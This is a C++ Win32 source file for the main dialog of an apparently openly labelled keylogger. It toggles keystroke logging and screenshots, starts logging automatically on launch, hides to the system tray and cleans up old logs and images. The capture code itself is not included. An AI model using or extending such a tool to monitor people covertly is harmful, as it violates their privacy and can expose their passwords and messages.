#define UNICODE
#define _UNICODE
#include <windows.h>
#include "resource.h"
#include <string>
#include <sstream>
#include <filesystem>
#include <iomanip>
#include "KeyloggerCore.h"
#include <shellapi.h>
#include <gdiplus.h>
#include "TrayIconManager.h"
#include "CleanupManager.h"
#pragma comment(lib, "Gdiplus.lib")

#define APP_MUTEX_NAME L"KeyloggerAppMutex"
#define APP_WINDOW_CLASS L"KeyloggerMainDialogClass"

static KeyloggerCore keylogger;
static COLORREF logColor = RGB(0, 128, 0);
static COLORREF ssColor = RGB(0, 128, 0);
static std::wstring logText = L"Logging: OFF";
static std::wstring ssText = L"Screenshots: OFF";
static HBRUSH hLogBrush = NULL;
static HBRUSH hSSBrush = NULL;

// Tray icon manager instance
static TrayIconManager* trayIconMgr = nullptr;

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void UpdateStatus(HWND hDlg);
void UpdateImagesSize(HWND hDlg);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    HANDLE hMutex = CreateMutexW(NULL, FALSE, APP_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        HWND hOther = FindWindowW(APP_WINDOW_CLASS, NULL);
        if (hOther)
        {
            ShowWindow(hOther, SW_SHOW);
            SetForegroundWindow(hOther);
            PostMessage(hOther, WM_TRAYICON, WM_LBUTTONDBLCLK, 0);
        }
        return 0;
    }
    WNDCLASSEX wc = {sizeof(WNDCLASSEX)};
    wc.lpfnWndProc = DefDlgProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = APP_WINDOW_CLASS;
    RegisterClassEx(&wc);
    DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_KEYLOGGER_DIALOG), NULL, DialogProc, 0);
    UnregisterClass(APP_WINDOW_CLASS, hInstance);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    return 0;
}

void UpdateStatus(HWND hDlg)
{
    bool log = keylogger.isLogging();
    bool ss = keylogger.isScreenshots();
    logText = log ? L"Logging: ON" : L"Logging: OFF";
    ssText = ss ? L"Screenshots: ON" : L"Screenshots: OFF";
    logColor = log ? RGB(0, 128, 0) : RGB(200, 0, 0);
    ssColor = ss ? RGB(0, 128, 0) : RGB(200, 0, 0);
    SetDlgItemText(hDlg, IDC_LOG_STATUS_LABEL, logText.c_str());
    SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, ssText.c_str());
    std::wstring logBtn = log ? L"Stop Logging [ON]" : L"Start Logging [OFF]";
    std::wstring ssBtn = ss ? L"Stop Screenshots [ON]" : L"Start Screenshots [OFF]";
    SetDlgItemText(hDlg, IDC_LOG_BTN, logBtn.c_str());
    SetDlgItemText(hDlg, IDC_SCREENSHOT_BTN, ssBtn.c_str());
    if (hLogBrush)
        DeleteObject(hLogBrush);
    if (hSSBrush)
        DeleteObject(hSSBrush);
    hLogBrush = CreateSolidBrush(logColor);
    hSSBrush = CreateSolidBrush(ssColor);
    UpdateImagesSize(hDlg);
    if (trayIconMgr)
        trayIconMgr->UpdateStatus(keylogger.isScreenshots());
}

void UpdateImagesSize(HWND hDlg)
{
    uintmax_t totalSize = 0;
    if (std::filesystem::exists("./images") && std::filesystem::is_directory("./images"))
    {
        for (const auto &entry : std::filesystem::directory_iterator("./images"))
        {
            if (entry.is_regular_file())
                totalSize += std::filesystem::file_size(entry);
        }
    }
    std::wstringstream ss;
    double sizeMB = totalSize / (1024.0 * 1024.0);
    ss << L"Images total size: " << std::fixed << std::setprecision(2) << sizeMB << L" MB";
    SetDlgItemText(hDlg, IDC_IMAGES_SIZE_LABEL, ss.str().c_str());
}

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_INITDIALOG:
        trayIconMgr = new TrayIconManager(hDlg);
        SetDlgItemInt(hDlg, IDC_DAYS_EDIT, 7, FALSE);
        UpdateStatus(hDlg);
        keylogger.start();
        return TRUE;
    case WM_SYSCOMMAND:
        if ((wParam & 0xFFF0) == SC_CLOSE)
        {
            if (trayIconMgr) {
                trayIconMgr->Show(keylogger.isScreenshots());
                trayIconMgr->MinimizeToTray();
            }
            ShowWindow(hDlg, SW_HIDE);
            return TRUE;
        }
        break;
    case WM_TRAYICON:
        if (lParam == WM_LBUTTONDBLCLK)
        {
            if (trayIconMgr) trayIconMgr->RestoreFromTray();
        }
        else if (lParam == WM_RBUTTONUP)
        {
            POINT pt;
            GetCursorPos(&pt);
            SetForegroundWindow(hDlg);
            if (trayIconMgr)
                TrackPopupMenu(trayIconMgr->GetMenu(), TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
        }
        break;
    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case IDC_DELETE_BTN:
        {
            int days = GetDlgItemInt(hDlg, IDC_DAYS_EDIT, NULL, FALSE);
            CleanupManager::DeleteOldImages(days);
            SetDlgItemText(hDlg, IDC_LOG_STATUS_LABEL, L"Old images deleted.");
            SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, L"");
            UpdateImagesSize(hDlg);
            break;
        }
        case IDC_DELETE_LOGS_BTN:
        {
            int days = GetDlgItemInt(hDlg, IDC_DAYS_EDIT, NULL, FALSE);
            CleanupManager::DeleteOldLogs(days);
            SetDlgItemText(hDlg, IDC_LOG_STATUS_LABEL, L"Old logs deleted.");
            SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, L"");
            break;
        }
        case IDC_LOG_BTN:
            keylogger.setLogging(!keylogger.isLogging());
            UpdateStatus(hDlg);
            break;
        case IDC_SCREENSHOT_BTN:
            keylogger.setScreenshots(!keylogger.isScreenshots());
            UpdateStatus(hDlg);
            break;
        case ID_TRAY_SCREENSHOT_TOGGLE:
            keylogger.setScreenshots(!keylogger.isScreenshots());
            UpdateStatus(hDlg);
            break;
        case ID_TRAY_EXIT:
            if (trayIconMgr) trayIconMgr->Remove();
            keylogger.stop();
            if (hLogBrush)
                DeleteObject(hLogBrush);
            if (hSSBrush)
                DeleteObject(hSSBrush);
            delete trayIconMgr;
            trayIconMgr = nullptr;
            EndDialog(hDlg, 0);
            break;
        case IDC_QUIT_BTN:
            if (trayIconMgr) trayIconMgr->Remove();
            keylogger.stop();
            if (hLogBrush)
                DeleteObject(hLogBrush);
            if (hSSBrush)
                DeleteObject(hSSBrush);
            delete trayIconMgr;
            trayIconMgr = nullptr;
            EndDialog(hDlg, 0);
            break;
        }
        break;
    case WM_CTLCOLORSTATIC:
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_LOG_STATUS_LABEL))
        {
            HDC hdcStatic = (HDC)wParam;
            SetBkMode(hdcStatic, TRANSPARENT);
            SetTextColor(hdcStatic, logColor);
            static HBRUSH hBrush = NULL;
            if (!hBrush)
                hBrush = CreateSolidBrush(GetSysColor(COLOR_3DFACE));
            return (INT_PTR)hBrush;
        }
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_SS_STATUS_LABEL))
        {
            HDC hdcStatic = (HDC)wParam;
            SetBkMode(hdcStatic, TRANSPARENT);
            SetTextColor(hdcStatic, ssColor);
            static HBRUSH hBrush = NULL;
            if (!hBrush)
                hBrush = CreateSolidBrush(GetSysColor(COLOR_3DFACE));
            return (INT_PTR)hBrush;
        }
        break;
    case WM_CTLCOLORBTN:
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_LOG_BTN))
        {
            return (INT_PTR)hLogBrush;
        }
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_SCREENSHOT_BTN))
        {
            return (INT_PTR)hSSBrush;
        }
        break;
    case WM_CLOSE:
        if (trayIconMgr) {
            trayIconMgr->Show(keylogger.isScreenshots());
            trayIconMgr->MinimizeToTray();
        }
        ShowWindow(hDlg, SW_HIDE);
        return 0;
    }
    return FALSE;
}
